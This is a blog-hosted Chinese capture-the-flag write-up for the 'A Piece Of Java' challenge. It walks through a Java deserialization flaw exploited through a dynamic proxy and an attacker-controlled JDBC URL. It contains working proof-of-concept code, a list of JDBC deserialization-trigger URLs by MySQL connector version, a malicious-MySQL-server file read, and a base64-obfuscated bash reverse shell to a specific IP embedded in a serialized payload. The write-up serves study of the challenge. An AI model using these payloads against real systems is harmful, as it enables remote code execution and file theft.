@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"123-prog.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01 源码审计主控制器下的路由&#x2F;hello，存在从外界输入获取序列化数据并进行反序列化的操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="(羊城杯 2020)A Piece Of Java">
+<meta property="og:url" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/index.html">
+<meta property="og:site_name" content="nappingCat&#39;s Blog">
+<meta property="og:description" content="0x01 源码审计主控制器下的路由&#x2F;hello，存在从外界输入获取序列化数据并进行反序列化的操作">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-21-54.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-22-18.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-12-14.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-15-37.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-19-31.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-28-21.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-30-57.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-28-45.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-29-45.png">
+<meta property="article:published_time" content="2021-09-06T15:26:05.000Z">
+<meta property="article:modified_time" content="2021-09-09T05:17:17.067Z">
+<meta property="article:author" content="nappingCat">
+<meta property="article:tag" content="mysql恶意服务端读取客户端文件">
+<meta property="article:tag" content="java反序列化">
+<meta property="article:tag" content="java动态代理知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-21-54.png">
+
+<link rel="canonical" href="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>(羊城杯 2020)A Piece Of Java | nappingCat's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">nappingCat's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          (羊城杯 2020)A Piece Of Java
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-09-06 23:26:05" itemprop="dateCreated datePublished" datetime="2021-09-06T23:26:05+08:00">2021-09-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-09 13:17:17" itemprop="dateModified" datetime="2021-09-09T13:17:17+08:00">2021-09-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x01-源码审计"><a href="#0x01-源码审计" class="headerlink" title="0x01 源码审计"></a>0x01 源码审计</h3><p>主控制器下的路由<code>/hello</code>，存在从外界输入获取序列化数据并进行反序列化的操作</p>
+<a id="more"></a>
+
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-21-54.png"></p>
+<p>看一下<code>deserialize()</code></p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-22-18.png"></p>
+<p>这里的配置文件<code>serialkiller.conf</code>里面设置了白名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;whitelist&gt;</span><br><span class="line">    &lt;regexp&gt;gdufs\..*&lt;&#x2F;regexp&gt;</span><br><span class="line">    &lt;regexp&gt;java\.lang\..*&lt;&#x2F;regexp&gt;</span><br><span class="line">&lt;&#x2F;whitelist&gt;</span><br></pre></td></tr></table></figure>
+<p>序列化只会序列化白名单里的类，这样限制了我们的漏洞利用</p>
+<p>注意到<code>/hello</code>路由反序列化了<code>Info</code>类，而且存在一个动态代理</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-12-14.png"></p>
+<p><code>Info</code>是一个接口类，<code>DatabaseInfo</code>和<code>UserInfo</code>实现这个接口，是两个委托类，看一下动态代理类覆写的<code>invoke</code>方法</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-15-37.png"></p>
+<p>判断方法名是否为<code>getAllInfo</code>，并且会执行<code>checkAllInfo()</code>，刚好在<code>DatabaseInfo</code>类中的<code>checkAllInfo()</code>存在连接数据库的行为，参数还全都可控</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-19-31.png"></p>
+<p>那么我们可以构造poc，构造一个动态代理类实例，<strong>代理<code>DatabaseInfo</code>的操作</strong>，对其序列化，作为反序列化的数据</p>
+<p><code>/hello</code>路由拿到数据反序列化之后，会调用<code>getAllInfo()</code>方法，因为动态代理的原因，会调用代理中的<code>invoke</code>方法，间接地调用了<code>checkAllInfo()</code>方法连接数据库，而且<code>jdbc</code>的<code>url</code>用的字符串拼接，完全可控</p>
+<p><code>poc.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        DatabaseInfo dataInfo = <span class="keyword">new</span> DatabaseInfo();  <span class="comment">//实例一个DatabaseInfo类</span></span><br><span class="line"></span><br><span class="line">        dataInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        dataInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">		<span class="comment">//设置为远程主机的ip:port</span></span><br><span class="line">        dataInfo.setUsername(<span class="string">&quot;fileread_/flag_AQUA&quot;</span>);</span><br><span class="line">        dataInfo.setPassword(<span class="string">&quot;123&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&quot;</span>);</span><br><span class="line">        <span class="comment">//通过Username和Password控制jdbc的url</span></span><br><span class="line">    </span><br><span class="line">        ClassLoader classLoader = dataInfo.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = dataInfo.getClass().getInterfaces();</span><br><span class="line">        InfoInvocationHandler infoInvocationHandler = <span class="keyword">new</span> InfoInvocationHandler(dataInfo);</span><br><span class="line">        Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler);</span><br><span class="line">		<span class="comment">//新建动态代理实例，需要获取委托类的ClassLoader和接口数组，将DatabaseInfo的实例作为参数传入</span></span><br><span class="line">        <span class="comment">//InfoInvocationHandler构造函数获取代理实例，最后拿到proxy，通过代理调用委托类的方法，会调用代</span></span><br><span class="line">        <span class="comment">//理类覆写的invoke方法作为代替</span></span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(proxy);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">        <span class="comment">//序列化数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>拿到base64串作为cookie的data值，即可实现对任意mysql服务端的连接</p>
+<h2 id="0x02-解法一：mysql恶意服务端读取文件"><a href="#0x02-解法一：mysql恶意服务端读取文件" class="headerlink" title="0x02 解法一：mysql恶意服务端读取文件"></a>0x02 解法一：mysql恶意服务端读取文件</h2><p>利用工具在vps上构造恶意mysql服务端</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p>构造恶意mysql服务端，令连接客户端发送其本地文件内容到服务端，实现任意读取文件</p>
+<p>例如，这里直接写jdbc的url作为例子</p>
+<p><code>jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_/etc/passwd&amp;password=xxx&amp;allowLoadLocalInfile=true</code></p>
+<p><code>jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_file:///&amp;password=xxx&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true</code></p>
+<blockquote>
+<p><code>allowLoadLocalInfile</code>为mysql jdbc的配置选项，允许mysql使用<code>LOAD DATA LOCAL INFILE ...</code>读取文件，否则可能读取不到文件内容</p>
+<p><code>allowUrlInLocalInfile</code>也是配置项，顾名思义，打开的话，允许在<code>LOAD DATA LOCAL INFILE ...</code>解析urls，各种协议都可以尝试，可以使用http实现SSRF，或者file协议读取文件，目录结构，如上例子2</p>
+</blockquote>
+<p>所以解法一就是利用恶意服务端读取根目录结构，发现flag文件直接读</p>
+<p>构造jdbc url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_file:&#x2F;&#x2F;&#x2F;&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true&amp;allowUrlInLocalInfile&#x3D;true&#96;</span><br></pre></td></tr></table></figure>
+<p>读取根目录结构</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-28-21.png"></p>
+<p>发现flag文件，更改jdbc url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_&#x2F;flag_AQUA&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true</span><br></pre></td></tr></table></figure>
+<p>读取flag</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-30-57.png"></p>
+<h3 id="0x02-解法二：mysql恶意服务端-java反序列化"><a href="#0x02-解法二：mysql恶意服务端-java反序列化" class="headerlink" title="0x02 解法二：mysql恶意服务端+java反序列化"></a>0x02 解法二：mysql恶意服务端+java反序列化</h3><p>mysql恶意服务端不仅仅可以读取客户端文件，还可以让客户端对服务端数据进行反序列化触发java反序列化漏洞</p>
+<p>mysql-connector的版本不一样，触发反序列化的点就不一样，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor触发</span><br><span class="line">8.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。</span><br><span class="line"></span><br><span class="line">5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀&#96; )┏</span><br><span class="line"></span><br><span class="line">detectCustomCollations触发：</span><br><span class="line">5.1.41及以上: 不可用</span><br><span class="line"></span><br><span class="line">5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.18以下的5.1.x版本： 不可用</span><br><span class="line"></span><br><span class="line">5.0.x版本不可用</span><br></pre></td></tr></table></figure>
+<p>看一下依赖，是<code>8.0.19</code>版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;8.0.19&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>所以触发反序列化的payload应该像下面一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>
+<p>同样使用上面的恶意Mysql服务端</p>
+<p>构造用户名为<code>yso_CommonsCollections5_command</code>，command换成弹shell的命令就可以，这里用到了ysoserial中的cc5链，因为在依赖中serialkiller为3.0版本，查看对应依赖，可以发现Commons-Collections 3.2.1的依赖，对应利用链cc5，ysoserial下载地址<a target="_blank" rel="noopener" href="https://github.com/angelwhu/ysoserial%EF%BC%8C%E5%9C%A8%E6%81%B6%E6%84%8Fmysql%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%60config.json%60%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AEysoserial%E8%B7%AF%E5%BE%84">https://github.com/angelwhu/ysoserial，在恶意mysql目录下的`config.json`文件配置ysoserial路径</a></p>
+<p><code>poc.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        DatabaseInfo dataInfo = <span class="keyword">new</span> DatabaseInfo();</span><br><span class="line"></span><br><span class="line">        dataInfo.setHost(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>);</span><br><span class="line">        dataInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dataInfo.setUsername(<span class="string">&quot;yso_CommonsCollections5_bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&quot;</span>);	</span><br><span class="line">        <span class="comment">//yso_CommonsCollections5_command，告诉伪造mysql服务用的那一条链</span></span><br><span class="line">        dataInfo.setPassword(<span class="string">&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">    	<span class="comment">//触发反序列化的配置</span></span><br><span class="line">        </span><br><span class="line">        ClassLoader classLoader = dataInfo.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = dataInfo.getClass().getInterfaces();</span><br><span class="line">        InfoInvocationHandler infoInvocationHandler = <span class="keyword">new</span> InfoInvocationHandler(dataInfo);</span><br><span class="line">        Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler);</span><br><span class="line">        <span class="comment">//老三样</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(proxy);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXN9AAAAAgAUamF2YS5pby5TZXJpYWxpemFibGUAHmdkdWZzLmNoYWxsZW5nZS53ZWIubW9kZWwuSW5mb3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRnZHVmcy5jaGFsbGVuZ2Uud2ViLmludm9jYXRpb24uSW5mb0ludm9jYXRpb25IYW5kbGVyY59H&#x2F;KdZhO8CAAFMAARpbmZvdAAgTGdkdWZzL2NoYWxsZW5nZS93ZWIvbW9kZWwvSW5mbzt4cHNyACZnZHVmcy5jaGFsbGVuZ2Uud2ViLm1vZGVsLkRhdGFiYXNlSW5mb19JEpYnRJPdAgAFTAAKY29ubmVjdGlvbnQAFUxqYXZhL3NxbC9Db25uZWN0aW9uO0wABGhvc3R0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgAJTAAEcG9ydHEAfgAJTAAIdXNlcm5hbWVxAH4ACXhwcHQADTEyMS4zNy4xMC4yNTR0AGUxMjMmYXV0b0Rlc2VyaWFsaXplPXRydWUmcXVlcnlJbnRlcmNlcHRvcnM9Y29tLm15c3FsLmNqLmpkYmMuaW50ZXJjZXB0b3JzLlNlcnZlclN0YXR1c0RpZmZJbnRlcmNlcHRvcnQABDMzMDZ0AJl5c29fQ29tbW9uc0NvbGxlY3Rpb25zNV9iYXNoJTIwLWMlMjAlN0JlY2hvJTJDWW1GemFDQXRhU0ElMkJKaUF2WkdWMkwzUmpjQzh4TWpFdU16Y3VNVEF1TWpVMEx6RXdNREFnTUQ0bU1RJTNEJTNEJTdEJTdDJTdCYmFzZTY0JTJDLWQlN0QlN0MlN0JiYXNoJTJDLWklN0Q&#x3D;</span><br></pre></td></tr></table></figure>
+<p>作为cookie中的data值</p>
+<p>执行，mysql服务端收到连接，发送相应payload</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-28-45.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-29-45.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
